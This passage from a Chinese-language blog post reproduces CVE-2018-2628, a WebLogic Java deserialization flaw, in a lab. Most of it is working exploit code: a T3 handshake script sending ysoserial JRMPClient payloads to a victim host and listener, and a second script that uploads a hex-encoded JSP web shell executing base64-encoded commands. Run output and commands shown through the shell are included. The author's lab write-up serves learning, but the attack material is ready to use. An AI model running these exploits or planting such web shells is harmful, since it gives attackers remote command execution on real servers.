&#x3D; &#39;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#39;.format(&#39;&#123;:04x&#125;&#39;.format(dport))</span><br><span class="line">    data3 &#x3D; &#39;1a7727000d3234322e323134&#39;</span><br><span class="line">    data4 &#x3D; &#39;2e312e32353461863d1d0000000078&#39;</span><br><span class="line">    for d in [data1,data2,data3,data4]:</span><br><span class="line">        sock.send(d.decode(&#39;hex&#39;))</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&#39;send request payload successful,recv length:%d&#39;%(len(sock.recv(2048))))</span><br><span class="line">def send_payload_objdata(sock, data):  payload&#x3D;&#39;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#39;</span><br><span class="line">    payload+&#x3D;data</span><br><span class="line">    payload+&#x3D;&#39;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#39;</span><br><span class="line">    payload &#x3D; &#39;%s%s&#39;%(&#39;&#123;:08x&#125;&#39;.format(len(payload)&#x2F;2 + 4),payload)</span><br><span class="line">    sock.send(payload.decode(&#39;hex&#39;))</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    sock.send(payload.decode(&#39;hex&#39;))</span><br><span class="line">    res &#x3D; &#39;&#39;</span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            res +&#x3D; sock.recv(4096)</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br><span class="line">    return res</span><br><span class="line">def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</span><br><span class="line">    sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(65)</span><br><span class="line">    server_addr &#x3D; (dip, dport)</span><br><span class="line">    t3_handshake(sock, server_addr)</span><br><span class="line">    build_t3_request_object(sock, dport)</span><br><span class="line">    payload &#x3D; generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br><span class="line">    print(&quot;payload: &quot; + payload)</span><br><span class="line">    rs&#x3D;send_payload_objdata(sock, payload)</span><br><span class="line">    print(&#39;response: &#39; + rs)</span><br><span class="line">    print(&#39;exploit completed!&#39;)</span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    #check for args, print usage if incorrect</span><br><span class="line">    if len(sys.argv) !&#x3D; 7:</span><br><span class="line">        print(&#39;\nUsage:\nexploit.py [victim ip] [victim port] [path to ysoserial] &#39;</span><br><span class="line">              &#39;[JRMPListener ip] [JRMPListener port] [JRMPClient]\n&#39;)</span><br><span class="line">        sys.exit()</span><br><span class="line">    dip &#x3D; sys.argv[1]</span><br><span class="line">    dport &#x3D; int(sys.argv[2])</span><br><span class="line">    path_ysoserial &#x3D; sys.argv[3]</span><br><span class="line">    jrmp_listener_ip &#x3D; sys.argv[4]</span><br><span class="line">    jrmp_listener_port &#x3D; sys.argv[5]</span><br><span class="line">    jrmp_client &#x3D; sys.argv[6]</span><br><span class="line">    exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python 44553.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]</span><br><span class="line">[victim ip]：目标weblogic的IP</span><br><span class="line">[victim port]：目标weblogic的端口</span><br><span class="line">[path to ysoserial] ：ysoserial的路径</span><br><span class="line">[JRMPListener ip] ：第一步中启动JRMP Server的IP地址</span><br><span class="line"> [JRMPListener port] ：第一步中启动JRMP Server的I端口地址</span><br><span class="line">[JRMPClient]：执行JRMPClient的类，可选的值是JRMPClient或JRMPClient2</span><br></pre></td></tr></table></figure>
+
+<p>等待一小会时间，双方会进行握手，进行数据交互，然后成功执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python2 44553.py 192.168.220.141 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.31.223 7089 JRMPClient</span><br><span class="line">handshake successful</span><br><span class="line">send request payload successful,recv length:1691</span><br><span class="line">command: java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar JRMPClient 192.168.31.223:7089 &gt; payload.out</span><br><span class="line">payload: aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3139322e3136382e33312e32323300001bb1000000007f55ff7000000000000000000000000000000078</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>进入环境中，查看是否执行成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a   #查看要进入容器的id</span><br><span class="line">docker exec -ti 容器id或容器名称 &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/37247/1.jpg" alt="执行成功"></p>
+</li>
+</ol>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>来自github上的一个python脚本，可以使用该方法执行一些命令</p>
+<p>地址：<a href="https://github.com/jas502n/CVE-2018-2628" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2018-2628</a></p>
+<ol>
+<li><p>执行脚本：(基于python2)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line">dip &#x3D; str(sys.argv[1])</span><br><span class="line">dport &#x3D; int(sys.argv[2])</span><br><span class="line">VUL&#x3D;[&#39;CVE-2018-2628&#39;]</span><br><span class="line">#remote ip changed to :127.0.0.1</span><br><span class="line">PAYLOAD&#x3D;[&#39;ACED0005737D00000001001D6A6176612E726D692E61637469766174696F6E2E416374697661746F72787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707372002D6A6176612E726D692E7365727665722E52656D6F74654F626A656374496E766F636174696F6E48616E646C657200000000000000020200007872001C6A6176612E726D692E7365727665722E52656D6F74654F626A656374D361B4910C61331E03000078707729000A556E69636173745265660000000005A2000000005649E3FD00000000000000000000000000000078&#39;]</span><br><span class="line">#remote ip:104.251.228.50</span><br><span class="line">#PAYLOAD&#x3D;[&#39;aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078&#39;]</span><br><span class="line">VER_SIG&#x3D;[&#39;\\$Proxy[0-9]+&#39;]</span><br><span class="line"># 0x01 获取weblogic版本</span><br><span class="line">def t3handshake(sock,server_addr):</span><br><span class="line">    sock.connect(server_addr)</span><br><span class="line">    sock.send(&#39;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#39;.decode(&#39;hex&#39;))</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    sock.recv(1024)</span><br><span class="line">    print &#39;handshake successful&#39;</span><br><span class="line"># 0x02</span><br><span class="line">def buildT3RequestObject(sock,port):</span><br><span class="line">    data1 &#x3D; &#39;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#39;</span><br><span class="line">    data2 &#x3D; &#39;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#39;.format(&#39;&#123;:04x&#125;&#39;.format(dport))</span><br><span class="line">    data3 &#x3D; &#39;1a7727000d3234322e323134&#39;</span><br><span class="line">    data4 &#x3D; &#39;2e312e32353461863d1d0000000078&#39;</span><br><span class="line">    for d in [data1,data2,data3,data4]:</span><br><span class="line">        sock.send(d.decode(&#39;hex&#39;))</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print &#39;send request payload successful,recv length:%d&#39;%(len(sock.recv(2048)))</span><br><span class="line">#0x03 getshell</span><br><span class="line">def sendGetShell(sock,data):   </span><br><span class="line">    s1 &#x3D; &quot;00000767056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000aced00057372002f6f72672e6170616368652e636f6d6d6f6e732e66696c6575706c6f61642e6469736b2e4469736b46696c654974656d1f0d7226839a887103000a5a000b6973466f726d4669656c644a000473697a6549000d73697a655468726573686f6c645b000d636163686564436f6e74656e747400025b424c000b636f6e74656e74547970657400124c6a6176612f6c616e672f537472696e673b4c000864666f7346696c6574000e4c6a6176612f696f2f46696c653b4c00096669656c644e616d6571007e00024c000866696c654e616d6571007e00024c00076865616465727374002f4c6f72672f6170616368652f636f6d6d6f6e732f66696c6575706c6f61642f46696c654974656d486561646572733b4c000a7265706f7369746f727971007e0003787000ffffffffffffffff00000000757200025b42acf317f8060854e00200007870000002d4&quot;</span><br><span class="line">    shell_file &#x3D; &quot;3c25407061676520696d706f72743d226a6176612e696f2e2a22253e0d0a3c25407061676520696d706f72743d2273756e2e6d6973632e4241534536344465636f64657222253e0d0a3c250d0a747279207b0d0a537472696e6720636d64203d20726571756573742e676574506172616d657465722822746f6d22293b0d0a537472696e6720706174683d6170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574526571756573745552492829293b0d0a537472696e67206469723d227765626c6f676963223b0d0a696628636d642e657175616c7328224e7a55314e672229297b6f75742e7072696e7428225b535d222b6469722b225b455d22293b7d0d0a627974655b5d2062696e617279203d204241534536344465636f6465722e636c6173732e6e6577496e7374616e636528292e6465636f646542756666657228636d64293b0d0a537472696e67206b636d64203d206e657720537472696e672862696e617279293b0d0a50726f63657373206368696c64203d2052756e74696d652e67657452756e74696d6528292e65786563286b636d64293b0d0a496e70757453747265616d20696e203d206368696c642e676574496e70757453747265616d28293b0d0a6f75742e7072696e7428222d3e7c22293b0d0a696e7420633b0d0a7768696c6520282863203d20696e2e7265616428292920213d202d3129207b0d0a6f75742e7072696e742828636861722963293b0d0a7d0d0a696e2e636c6f736528293b0d0a6f75742e7072696e7428227c3c2d22293b0d0a747279207b0d0a6368696c642e77616974466f7228293b0d0a7d2063617463682028496e746572727570746564457863657074696f6e206529207b0d0a652e7072696e74537461636b547261636528293b0d0a7d0d0a7d2063617463682028494f457863657074696f6e206529207b0d0a53797374656d2e6572722e7072696e746c6e2865293b0d0a7d&quot;</span><br><span class="line">    filename &#x3D; (str(sys.argv[3])).encode(&quot;hex&quot;)</span><br><span class="line">    #print &quot;\n&gt;&gt;&gt;shell filename: %s &gt;&gt;16-hex %s&quot; % (str(sys.argv[3]),filename)</span><br><span class="line">    #print &quot;\n\n&quot;</span><br><span class="line">    s3 &#x3D; &quot;0d0a253e7400186170706c69636174696f6e2f6f637465742d73747265616d707400047465737471007e0009707372000c6a6176612e696f2e46696c65042da4450e0de4ff0300014c00047061746871007e0002787074004d736572766572735c41646d696e5365727665725c746d705c5f574c5f696e7465726e616c5c6265615f776c735f696e7465726e616c5c396a3464716b5c7761725c%sc0807702005c7878fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&quot; % (filename)</span><br><span class="line">    payload1 &#x3D; s1 + shell_file + s3</span><br><span class="line">    #print &quot;GetShell Payload: %s&quot; % payload1</span><br><span class="line">    #print &quot;\n\n&quot;</span><br><span class="line">    print &quot;\n\n &gt;&gt;&gt;&gt;usage: python cve-2018-2628.py ip port shell1.jsp \n\n&quot;</span><br><span class="line">    print &quot;\n&gt;&gt;&gt;Shell File Upload Dir: \n\n&quot;, r&quot;servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war\%s&quot; % (str(sys.argv[3]))</span><br><span class="line">    print </span><br><span class="line">    for i in [payload1]:</span><br><span class="line">        sock.send(i.decode(&quot;hex&quot;))</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;&quot; + dip + &quot;:&quot; + str(dport)</span><br><span class="line">    print &quot;\n&gt;&gt;&gt;Getshell: %s&#x2F;bea_wls_internal&#x2F;%s?tom&#x3D;d2hvYW1pCg&#x3D;&#x3D;&quot; % (url, (str(sys.argv[3])))</span><br><span class="line">def run(dip,dport,index):</span><br><span class="line">    sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整</span><br><span class="line">    sock.settimeout(20)</span><br><span class="line">    server_addr &#x3D; (dip, dport)</span><br><span class="line">    t3handshake(sock,server_addr)</span><br><span class="line">    #buildT3RequestObject(sock,dport)</span><br><span class="line">    rs&#x3D;sendGetShell(sock,PAYLOAD[index])</span><br><span class="line">    #print &#39;rs&#39;,rs</span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    run(dip,dport,0)</span><br></pre></td></tr></table></figure>
+<p>执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2018-2628-Getshell.py 目标地址 目标端口 test11.jsp</span><br><span class="line">(注意: 上面test11.jsp为你起的文件名，改名字需要长度等于10)</span><br></pre></td></tr></table></figure>
+<p>执行结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面# python CVE-2018-2628-Getshell.py 192.168.220.141 7001 test11.jsp</span><br><span class="line">handshake successful</span><br><span class="line"> &gt;&gt;&gt;&gt;usage: python cve-2018-2628.py ip port shell1.jsp </span><br><span class="line">&gt;&gt;&gt;Shell File Upload Dir: </span><br><span class="line">servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war\test11.jsp</span><br><span class="line">&gt;&gt;&gt;Getshell: http:&#x2F;&#x2F;192.168.220.141:7001&#x2F;bea_wls_internal&#x2F;test11.jsp?tom&#x3D;d2hvYW1pCg&#x3D;&#x3D;</span><br><span class="line">root@kali:~&#x2F;桌面#</span><br></pre></td></tr></table></figure></li>
+<li><p>现在我们已经获取了一个地址，打开浏览器访问它：</p>
+<p><img src="/posts/37247/2.png" alt="whoami"></p>
+</li>
+<li><p>我们执行了whoami的命令。上面 tom 后面的变量即为 whomai 的base64编码，我们可以使用 kali 来生成任意base64编码，来替换该变量，以达到执行任意命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# echo &quot;uname -a&quot; | base64</span><br><span class="line">dW5hbWUgLWEK</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/37247/3.png" alt="uname -a"></p>
+</li>
+<li><p>不难发现，上面的test11变为了test12，是因为在进行多次测试的时候发现，生成完一次脚本的连接仅能访问一次，第二次访问会返回404…</p>
+</li>
+</ol>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然上面的复现都执行成功了，但是我还是不太理解，脚本还不明白，以后要继续看，最好是能够自己学习写脚本。</p>
+
+  </div>
+</article>
+
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: 'euAQjqlW2tS4fVHxsmyLkdLj-gzGzoHsz',
+            appKey: 'Fmn6CIIN9yyDif6AC2hxSglA',
+            placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+            avatar: 'robohash'
+        })
+    </script>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/images/">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Java序列化与反序列化"><span class="toc-number">1.1.</span> <span class="toc-text">Java序列化与反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#相关历史漏洞"><span class="toc-number">1.2.</span> <span class="toc-text">相关历史漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#涉及版本"><span class="toc-number">1.3.</span> <span class="toc-text">涉及版本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞复现"><span class="toc-number">2.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#方法一"><span class="toc-number">2.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法二"><span class="toc-number">2.2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://mysecroad.github.io/posts/37247.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://mysecroad.github.io/posts/37247.html&text=Weblogic复现之Java反序列化" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://mysecroad.github.io/posts/37247.html&title=Weblogic复现之Java反序列化" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://mysecroad.github.io/posts/37247.html&is_video=false&description=Weblogic复现之Java反序列化" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Weblogic复现之Java反序列化&body=Check out this article: http://mysecroad.github.io/posts/37247.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://mysecroad.github.io/posts/37247.html&title=Weblogic复现之Java反序列化" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://mysecroad.github.io/posts/37247.html&title=Weblogic复现之Java反序列化" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://mysecroad.github.io/posts/37247.html&title=Weblogic复现之Java反序列化" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://mysecroad.github.io/posts/37247.html&title=Weblogic复现之Java反序列化" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://mysecroad.github.io/posts/37247.html&name=Weblogic复现之Java反序列化&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://mysecroad.github.io/posts/37247.html&t=Weblogic复现之Java反序列化" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2020
+    ca5tle
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/images/">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
